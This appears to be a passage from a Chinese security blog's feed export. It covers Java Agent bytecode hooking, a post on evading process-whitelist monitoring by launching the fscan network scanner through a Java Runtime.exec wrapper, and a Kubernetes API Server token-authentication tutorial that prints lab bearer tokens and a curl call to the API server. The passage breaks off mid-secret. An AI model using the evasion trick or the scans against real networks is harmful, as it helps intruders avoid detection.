class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">40</span>, <span class="number">91</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">103</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">91</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">77</span>, <span class="number">97</span>, <span class="number">112</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">83</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">70</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">77</span>, <span class="number">121</span>, <span class="number">67</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">46</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">41</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">120</span>, <span class="number">107</span>, <span class="number">33</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">44</span>, <span class="number">0</span>, <span class="number">45</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">111</span>, <span class="number">119</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">119</span>, <span class="number">47</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">77</span>, <span class="number">121</span>, <span class="number">67</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">79</span>, <span class="number">98</span>, <span class="number">106</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">114</span>, <span class="number">117</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">100</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">112</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">108</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">84</span>, <span class="number">104</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">115</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">40</span>, <span class="number">74</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, -<span class="number">78</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">18</span>, <span class="number">3</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">4</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">42</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">1</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, -<span class="number">72</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">6</span>, -<span class="number">72</span>, <span class="number">0</span>, <span class="number">8</span>, -<span class="number">89</span>, -<span class="number">1</span>, -<span class="number">9</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">27</span>]</span><br><span class="line">Fxxk!</span><br><span class="line">Fxxk!</span><br></pre></td></tr></table></figure>

<p>成功替换了字符</p>
<h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h2><p>本文先介绍了Java Agent相关概率，然后分别实验了静态和动态Hook。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://www.cnblogs.com/rickiyang/p/11368932.html">https://www.cnblogs.com/rickiyang/p/11368932.html</a></li>
<li><a href="https://fynch3r.github.io/Java-Agent%E8%A7%A3%E8%AF%BB/">https://fynch3r.github.io/Java-Agent%E8%A7%A3%E8%AF%BB/</a></li>
<li><a href="https://zhishihezi.net/b/5d644b6f81cbc9e40460fe7eea3c7925">https://zhishihezi.net/b/5d644b6f81cbc9e40460fe7eea3c7925</a></li>
<li><a href="https://su18.org/post/irP0RsYK1/">https://su18.org/post/irP0RsYK1/</a></li>
</ul>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java基础</tag>
      </tags>
  </entry>
  <entry>
    <title>Java Runtime执行命令分析</title>
    <url>/Java-Runtime%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>前段时间测试的时候发现，通过白名单java进程使用Runtime系统调用进行命令执行可以绕过白名单进程监控。</p>
<span id="more"></span>

<h2 id="Runtime-java代码"><a href="#Runtime-java代码" class="headerlink" title="Runtime java代码"></a>Runtime java代码</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RuntimeTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(String s:args)&#123;</span><br><span class="line">            System.out.println(s+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        String command = args[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        Process process= Runtime.getRuntime().exec(command);</span><br><span class="line">        InputStream fis = process.getInputStream();</span><br><span class="line">        InputStreamReader isr = <span class="keyword">new</span> InputStreamReader(fis);</span><br><span class="line">        BufferedReader br = <span class="keyword">new</span> BufferedReader(isr);</span><br><span class="line">        String tmp = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">while</span> ((tmp = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(tmp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将其打包成Jar。然后执行如下命令</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">java </span>-<span class="keyword">jar </span>runtime.<span class="keyword">jar </span><span class="string">&quot;/tmp/fscan/fscan -h 192.168.1.1/16&quot;</span></span><br></pre></td></tr></table></figure>

<p>进程关系如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@debian ~]# ps -ef</span><br><span class="line">UID         PID   PPID  C STIME TTY          TIME CMD</span><br><span class="line">root      25002  21915  2 14:40 pts/13   00:00:00 java -jar runtime.jar /tmp/fscan/fscan -h 192.168.1.1/16</span><br><span class="line">root      25012  25002 91 14:40 pts/13   00:00:05 /tmp/fscan/fscan -h 192.168.1.1/16</span><br></pre></td></tr></table></figure>

<p>可以看见Runtime执行命令也是fork出一个子进程。</p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kubernetes API Server 认证与授权</title>
    <url>/Kubernetes-API-Server-%E8%AE%A4%E8%AF%81%E4%B8%8E%E6%8E%88%E6%9D%83/</url>
    <content><![CDATA[<blockquote>
<p>凡所有相，皆是虚妄。若见诸相非相，即见如来。</p>
</blockquote>
<p>了解Kubernetes API Server的认证与授权能让我们更清楚的了解Kubernetes的安全机制</p>
<span id="more"></span>

<h2 id="1-Bootstrap-Tokens认证"><a href="#1-Bootstrap-Tokens认证" class="headerlink" title="1. Bootstrap Tokens认证"></a>1. Bootstrap Tokens认证</h2><p>启动引导令牌是一种简单的持有者令牌（Bearer Token），这种令牌是在新建集群 或者在现有集群中添加新节点时使用的。 </p>
<p>启动引导令牌使用 <code>abcdef.0123456789abcdef</code> 的形式。 更加规范地说，它们必须符合正则表达式 <code>[a-z0-9]&#123;6&#125;\.[a-z0-9]&#123;16&#125;</code>。令牌的第一部分是 “Token ID”，它是一种公开信息，用于引用令牌并确保不会 泄露认证所使用的秘密信息。 第二部分是“令牌秘密（Token Secret）”，它应该被共享给受信的第三方。</p>
<p>启动引导令牌认证组件可以通过 API 服务器上的如下标志启用：</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">--<span class="keyword">enable</span>-bootstrap-<span class="built_in">token</span>-auth</span><br></pre></td></tr></table></figure>

<p>我们可以在kube-apiserver.yaml文件中查看是否启用。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line">[<span class="string">root@master</span> <span class="string">manifests</span>]<span class="comment"># cat /etc/kubernetes/manifests/kube-apiserver.yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="string">......</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">command:</span></span><br><span class="line">	<span class="string">.......</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--enable-bootstrap-token-auth=true</span></span><br><span class="line">	<span class="string">.....</span></span><br><span class="line">  </span><br></pre></td></tr></table></figure>

<p>使用kubeadm查看Bearer Token</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master manifests]<span class="comment"># kubeadm token create --print-join-command</span></span><br><span class="line">kubeadm join 172.16.42.100:6443 --token j37jxe.gjv3g740s4gw045p --discovery-token-ca-cert-hash sha256:7e243bc69c1465069c54fd05d7c09c16d7150b09be2598b34f7fae9d60ebc68f</span><br></pre></td></tr></table></figure>

<p>通过token访问api server(使用静态令牌访问需要添加Bearer)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -k --header <span class="string">&quot;Authorization: Bearer fifuvj.jjqcsc3cmptk08aw&quot;</span> https://172.16.42.100:6443/api</span><br></pre></td></tr></table></figure>





<h2 id="2-服务账号令牌"><a href="#2-服务账号令牌" class="headerlink" title="2. 服务账号令牌"></a>2. 服务账号令牌</h2><p>服务账号令牌是Kubernetes默认启用的用户认证机制，</p>
<p>通过如下命令查看token</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master manifests]<span class="comment"># kubectl describe secrets</span></span><br><span class="line">Name:         default-token-7xts4</span><br><span class="line">Namespace:    default</span><br><span class="line">Labels:       &lt;none&gt;</span><br><span class="line">Annotations:  kubernetes.io/service-account.name: default</span><br><span class="line">              kubernetes.io/service-account.uid: 720096c3-c0ea-4f03-889c-6d450ab62d2c</span><br><span class="line"></span><br><span class="line">Type:  kubernetes.io/service-account-token</span><br><span class="line"></span><br><span class="line">Data</span><br><span class="line">====</span><br><span class="line">ca.crt:     1066 bytes</span><br><span class="line">namespace:  7 bytes</span><br><span class="line">token:      eyJhbGciOiJSUzI1NiIsImtpZCI6IjVlYkx2aWRndzBVbm42VHYzQmNXaXdjdkl4cGZyWDFFd3l0aFBJY3pxNEkifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tN3h0czQiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjcyMDA5NmMzLWMwZWEtNGYwMy04ODljLTZkNDUwYWI2MmQyYyIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.sSEmxeJ2XIwb95t50ehRGvTUEOOQjjdTK5ula6AtgPV4z7m7YzpPKDSeQSauLWul272j9SLYyuiWR6rnoC4NvAgxgsAbapraJcyDjv0DadWUfbTcjLUSNGGaSQMuOyrYPA_ahK6UuFS_kAOiXL71gPLjE6xUcm8T4-aAgszUSG78OrMDmDao9ZoS2iD0TOVWNsxfUFw712meB4t2C5cj5DhfrDKdGLlJ4HRs3E0EYyPkX8NizaeSjifT-_AxFL7_KrL6GM4nMM8AEWoSn3v1N4CyQkvU5Bb2xu4hyZGX6OAWkcFNoMC4jEfeIgWbj6MC0elhuGYVznyr65GKtcjG</span><br></pre></td></tr></table></figure>

<p>同样的方法访问api server</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master manifests]<span class="comment"># curl -k --header &quot;Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjVlYkx2aWRndzBVbm42VHYzQmNXaXdjdkl4cGZyWDFFd3l0aFBJY3pxNEkifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tN3h0czQiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjcyMDA5NmMzLWMwZWEtNGYwMy04ODljLTZkNDUwYWI2MmQyYyIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.sSEmxeJ2XIwb95t50ehRGvTUEOOQjjdTK5ula6AtgPV4z7m7YzpPKDSeQSauLWul272j9SLYyuiWR6rnoC4NvAgxgsAbapraJcyDjv0DadWUfbTcjLUSNGGaSQMuOyrYPA_ahK6UuFS_kAOiXL71gPLjE6xUcm8T4-aAgszUSG78OrMDmDao9ZoS2iD0TOVWNsxfUFw712meB4t2C5cj5DhfrDKdGLlJ4HRs3E0EYyPkX8NizaeSjifT-_AxFL7_KrL6GM4nMM8AEWoSn3v1N4CyQkvU5Bb2xu4hyZGX6OAWkcFNoMC4jEfeIgWbj6MC0elhuGYVznyr65GKtcjG6w&quot; https://172.16.42.100:6443/api</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;kind&quot;</span>: <span class="string">&quot;APIVersions&quot;</span>,</span><br><span class="line">  <span class="string">&quot;versions&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;v1&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;serverAddressByClientCIDRs&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;clientCIDR&quot;</span>: <span class="string">&quot;0.0.0.0/0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;serverAddress&quot;</span>: <span class="string">&quot;172.16.42.100:6443&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br></pre></td></tr></table></figure>



<p><strong>创建一个 server account:</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建账号</span></span><br><span class="line">[root@master kubernetes]<span class="comment"># kubectl create serviceaccount jenkins</span></span><br><span class="line">serviceaccount/jenkins created</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看账号信息</span></span><br><span class="line">[root@master kubernetes]<span class="comment"># kubectl get serviceaccounts jenkins -o yaml</span></span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: ServiceAccount</span><br><span class="line">metadata:</span><br><span class="line">  creationTimestamp: <span class="string">&quot;2022-01-04T08:20:23Z&quot;</span></span><br><span class="line">  name: jenkins</span><br><span class="line">  namespace: default</span><br><span class="line">  resourceVersion: <span class="string">&quot;198784&quot;</span></span><br><span class="line">  uid: f3a618fa-07b5-42ed-af2e-17d1330d8dcd</span><br><span class="line">secrets:</span><br><span class="line">- name: jenkins-token-c2fll</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看该账号的token</span></span><br><span class="line">[root@master kubernetes]<span class="comment"># kubectl get secret jenkins-token-c2fll -o yaml</span></span><br><span class="line">apiVersion: v1</span><br><span class="line">data:</span><br><span class="line">  ca.crt: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUM1ekNDQWMrZ0F3SUJBZ0lCQURBTkJna3Foa2lHOXcwQkFRc0ZBREFWTVJNd0VRWURWUVFERXdwcmRXSmwKY201bGRHVnpNQjRYRFRJeE1USXlOekEyTWpRMU1Gb1hEVE14TVRJeU5UQTJNalExTUZvd0ZURVRNQkVHQTFVRQpBeE1LYTNWaVpYSnVaWFJsY3pDQ0FTSXdEUVlKS29aSWh2Y05BUUVCQlFBRGdnRVBBRENDQVFvQ2dnRUJBS2xZCnJCTnF4S29FcGxIVVJFaHRGSkJENFRUNlRNamwyNFdrRGNObnhocnVwSVh3dXJJMzQxVi9ZN2hoRzBaSTFjeXAKcnFjVUNLMUlGQk1ZektLSnNrVE5nWG16WkZJUkFyNUtkSlI5RFQwWUt6MzY3dnUvYUsrU3ArUVRRQktQQ2ZORgpRd3VaZXkyYXAxRG5Ba1pQTWVZYlVzTHgwa1ljU2lBMitEbHNYdHdPRUtUSkNYVThKRHE1YXRPcVUxTXhPZVI0ClJqRFBLY0k3djBsV2xtdzFFSWlkTFA3aThFelhGcTVBUzA4R2gzZ2hSYyt2UHV6MWNhV29hOFBlVXBCWjZ0a0wKMU1aZlZvZVAvT1hmWVJDaURIY21LK05FSU0yWXFmVGI2NjlyODZyOFAzWnVTSko2a0pQdmd0YzdNZys2eWZiWgpzbGtrUzV4Q1YweHhwVkxLbTkwQ0F3RUFBYU5DTUVBd0RnWURWUjBQQVFIL0JBUURBZ0trTUE4R0ExVWRFd0VCCi93UUZNQU1CQWY4d0hRWURWUjBPQkJZRUZFemhQNXFNdG52Q2tzUmR6ZkkyRVpleHkzTjRNQTBHQ1NxR1NJYjMKRFFFQkN3VUFBNElCQVFCQmhqY1FFN0RFTFN6dkJFUDQ4c0pQVGNXUUVFT1dWT1lGUk9mUWNmNEk3VDhCY3BhRQowZXpGWi9HaXI4TXQwMFJFTHVGL3FpUElZR3BXOTYvMm5LK3RsQVdpRHBGOWhkTkRZdXlQWWpyd1V2TXl2eE5XCnViM2NaY1FmcGdab0FDWVZmUURJWXVMUGFDaDBNRmdzcnR4NmFDUWw5S3h4MnNIQ1lKcE9aZzRjOUtQNi9LSk0KTFhBT0tJeHpwbjg0cXR1N3ZLK0EwY2ZCd29VQUJwcGFqZlVHcVRocFlYLzhmSm51M3RoY01mMXN5NnVHeTdtMgp1bGNHWnpTdm9UME5ycGJ2RzR5ckZpcDRQYXdWRTgxYWI5VlhjN3pJUmJwM3B1YmlCalR1elJhZ1hQdUY4cmV0CkUyRVNXVGlESDZLcXVPU1UwNEt6dWJhbDNFaGVPQXhGekcySgotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg==</span><br><span class="line">  namespace: ZGVmYXVsdA==</span><br><span class="line">  token: 